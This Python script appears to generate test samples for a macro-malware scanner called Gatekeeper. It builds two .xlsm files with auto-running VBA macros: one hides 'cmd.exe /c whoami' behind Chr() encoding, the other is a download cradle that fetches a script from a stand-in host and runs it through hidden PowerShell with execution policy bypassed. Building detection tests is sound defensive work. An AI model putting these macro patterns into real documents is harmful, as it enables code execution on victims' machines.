"""
generate_test_samples.py
========================
Generates two suspicious .xlsm test files with real embedded VBA macros
for testing Gatekeeper's detection layers.

BEFORE RUNNING:
  1. Install pywin32:
        py -3.12 -m pip install pywin32

  2. Enable "Trust access to VBA project object model" in Excel:
        Excel -> File -> Options -> Trust Center -> Trust Center Settings
        -> Macro Settings -> check "Trust access to the VBA project object model"

  3. Run from your project root:
        py -3.12 generate_test_samples.py

OUTPUT:
  sample_files/chr_obfuscated_macro.xlsm      (tests Layer 2 - deobfuscation)
  sample_files/download_cradle_macro.xlsm     (tests Layer 5 - YARA)
"""

import os
import sys

# ---------------------------------------------------------------------------
# VBA payloads
# ---------------------------------------------------------------------------

# File 1 — Chr() obfuscation test
# Designed to test Layer 2 (deobfuscation feedback loop)
# "Shell" and "cmd.exe" are encoded as Chr() sequences
# A naive scanner that skips deobfuscation would miss these entirely
VBA_CHR_OBFUSCATED = r'''\
Private Sub Auto_Open()
    \'  ---------------------------------------------------------------
    \'  Simulated malware: Chr() encoding used to hide keywords
    \'  from static analysis tools that do not decode Chr() sequences.
    \'  Gatekeeper\'s deobfuscator should reconstruct these before
    \'  rule matching runs.
    \'  ---------------------------------------------------------------

    \'  Chr(83,104,101,108,108) = "Shell"
    Dim sFunc As String
    sFunc = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

    \'  Chr(99,109,100,46,101,120,101) = "cmd.exe"
    Dim sExe As String
    sExe = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)

    \'  Chr(119,104,111,97,109,105) = "whoami"
    Dim sArg As String
    sArg = Chr(32) & Chr(47) & Chr(99) & Chr(32) & Chr(119) & Chr(104) _
         & Chr(111) & Chr(97) & Chr(109) & Chr(105)

    \'  Reconstruct and execute: Shell "cmd.exe /c whoami"
    Shell sExe & sArg, vbNormalFocus

End Sub
'''

# File 2 — Download cradle test
# Designed to test Layer 5 (YARA) and Layer 6 (co-occurrence heuristic)
# Uses XMLHTTP + WScript.Shell + powershell — the classic dropper pattern
# URL and payload are intentionally fake / harmless
VBA_DOWNLOAD_CRADLE = r'''\
Private Sub Workbook_Open()
    \'  ---------------------------------------------------------------
    \'  Simulated malware: HTTP download cradle pattern
    \'  Fetches a "payload" via MSXML2.XMLHTTP and executes it via
    \'  WScript.Shell + PowerShell.
    \'
    \'  URL is intentionally fake — this file is a Gatekeeper test sample.
    \'  YARA rules vba_download_cradles and vba_shell_execution should fire.
    \'  ---------------------------------------------------------------

    Dim oHTTP    As Object
    Dim oShell   As Object
    Dim sURL     As String
    Dim sPayload As String

    \'  Layer 5 trigger: MSXML2.XMLHTTP download cradle
    sURL = "http://fake-malware-test.example.com/payload.ps1"
    Set oHTTP = CreateObject("MSXML2.XMLHTTP")
    oHTTP.Open "GET", sURL, False
    oHTTP.Send

    sPayload = oHTTP.ResponseText

    \'  Layer 5 trigger: WScript.Shell + powershell execution
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -ExecutionPolicy bypass -nop -w hidden -enc " & sPayload, 0, False

    \'  Layer 6 trigger: environ used for staging path
    Dim sStaging As String
    sStaging = Environ("APPDATA") & "\update.exe"

End Sub
'''

# ---------------------------------------------------------------------------
# Generator
# ---------------------------------------------------------------------------

def create_xlsm_with_vba(output_path: str, vba_code: str, sheet_name: str = "Sheet1"):
    """
    Creates a macro-enabled Excel workbook (.xlsm) with the given VBA code
    embedded in Module1 using Excel's COM automation interface.

    Args:
        output_path: Full path where the .xlsm file should be saved.
        vba_code:    VBA source code to embed in the workbook module.
        sheet_name:  Name for the default worksheet.
    """
    try:
        import win32com.client as win32
    except ImportError:
        print("[!] pywin32 not installed.")
        print("    Run: py -3.12 -m pip install pywin32")
        sys.exit(1)

    abs_path = os.path.abspath(output_path)
    print(f"[*] Creating: {abs_path}")

    excel = None
    wb    = None

    try:
        excel = win32.gencache.EnsureDispatch("Excel.Application")
        excel.Visible       = False
        excel.DisplayAlerts = False

        wb = excel.Workbooks.Add()
        wb.Sheets(1).Name = sheet_name

        # Embed VBA into Module1
        # Requires "Trust access to VBA project object model" to be enabled
        try:
            vba_module = wb.VBProject.VBComponents.Add(1)  # 1 = vbext_ct_StdModule
            vba_module.Name = "Module1"
            vba_module.CodeModule.AddFromString(vba_code)
        except Exception as e:
            if "programmatic access" in str(e).lower() or "-2147221230" in str(e):
                print()
                print("[!] Excel blocked programmatic VBA access.")
                print("    Enable it via:")
                print("    Excel → File → Options → Trust Center → Trust Center Settings")
                print("    → Macro Settings → check 'Trust access to the VBA project object model'")
                print("    Then re-run this script.")
                sys.exit(1)
            raise

        # FileFormat 52 = xlOpenXMLWorkbookMacroEnabled (.xlsm)
        wb.SaveAs(abs_path, FileFormat=52)
        print(f"[+] Saved: {abs_path}")

    except Exception as e:
        print(f"[!] Failed to create {output_path}: {e}")
        sys.exit(1)

    finally:
        if wb:
            try:
                wb.Close(False)
            except Exception:
                pass
        if excel:
            try:
                excel.Quit()
            except Exception:
                pass


def main():
    """
    Generates both test sample files into the sample_files/ directory.
    """
    os.makedirs("sample_files", exist_ok=True)

    print("=" * 60)
    print("Gatekeeper Test Sample Generator")
    print("=" * 60)
    print()

    # File 1: Chr() obfuscation — tests Layer 2 (deobfuscation)
    create_xlsm_with_vba(
        output_path="sample_files/chr_obfuscated_macro.xlsm",
        vba_code=VBA_CHR_OBFUSCATED,
        sheet_name="ChrObfTest"
    )

    print()

    # File 2: Download cradle — tests Layer 5 (YARA) + Layer 6 (heuristic)
    create_xlsm_with_vba(
        output_path="sample_files/download_cradle_macro.xlsm",
        vba_code=VBA_DOWNLOAD_CRADLE,
        sheet_name="CradleTest"
    )

    print()
    print("=" * 60)
    print("[+] Both files generated. Now run Gatekeeper against them:")
    print()
    print("    py -3.12 gatekeeper.py sample_files\\chr_obfuscated_macro.xlsm")
    print("    py -3.12 gatekeeper.py sample_files\\download_cradle_macro.xlsm")
    print()
    print("Expected results:")
    print("  chr_obfuscated_macro.xlsm  -> BLOCKED (Chr() decoded to Shell/cmd.exe)")
    print("  download_cradle_macro.xlsm -> BLOCKED (YARA: download cradle + WScript.Shell)")
    print("=" * 60)


if __name__ == "__main__":
    main()
